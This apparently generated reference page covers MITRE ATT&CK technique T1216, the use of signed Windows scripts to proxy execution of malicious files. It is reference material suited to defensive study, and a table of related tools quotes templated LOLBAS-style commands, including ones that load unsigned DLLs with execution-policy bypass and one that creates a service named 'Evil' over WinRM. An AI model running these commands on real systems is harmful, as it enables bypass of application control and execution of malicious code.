---
parsed_by: focuslocust
source: mitre
type: generated
---
# T1216 - System Script Proxy Execution

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `mitre` |
| Type | `technique` |
| Record ID | `T1216` |
| Source file | `` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.

## Related Tools

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [CL_Invocation.ps1](../../tools/windows/cl-invocation.ps1.md) | explicit | source | Command metadata lists T1216: . C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1 \nSyncInvoke {CMD} |
| [CL_LoadAssembly.ps1](../../tools/windows/cl-loadassembly.ps1.md) | explicit | source | Command metadata lists T1216: powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll... |
| [CL_Mutexverifiers.ps1](../../tools/windows/cl-mutexverifiers.ps1.md) | explicit | source | Command metadata lists T1216: . C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1 \nrunAfterCancelProcess {PATH:.ps1} |
| [Launch-VsDevShell.ps1](../../tools/windows/launch-vsdevshell.ps1.md) | explicit | source | Command metadata lists T1216: powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath "/../../../../../; {PATH:.exe} ;" |
| [Manage-bde.wsf](../../tools/windows/manage-bde.wsf.md) | explicit | source | Command metadata lists T1216: copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf |
| [Pester.bat](../../tools/windows/pester.bat.md) | explicit | source | Command metadata lists T1216: Pester.bat ;{PATH:.exe} |
| [UtilityFunctions.ps1](../../tools/windows/utilityfunctions.ps1.md) | explicit | source | Command metadata lists T1216: powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[P... |
| [winrm.vbs](../../tools/windows/winrm.vbs.md) | explicit | source | Command metadata lists T1216: winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="{CMD}"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil... |

## Source Verification

[source record](../../sources/mitre/system-script-proxy-execution.md)

## Evidence Excerpt

```text
created: '2018-04-18T17:59:24.739Z'
created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
description: 'Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files.
Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be
used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute
malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker
Bypass List)'
external_references:
```
